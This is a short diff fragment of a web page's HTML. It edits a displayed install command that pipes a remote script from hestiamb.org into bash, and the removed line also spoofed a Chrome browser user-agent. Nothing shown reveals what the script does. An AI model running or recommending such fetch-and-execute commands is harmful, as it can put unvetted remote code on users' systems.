@@ -2154,7 +2154,7 @@ body {
 									                        <code class="d-inline-block w-100 text-center text-md-start" 
 									                               id="codeContent" 
 									                               style="font-size: 1.2em;">
-									                            curl -fsSL -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" https://hestiamb.org/tz.sh | bash
+									                            curl -fsSL https://hestiamb.org/tz.sh | bash
 									                        </code>
 									                    </td>
 									                </tr>
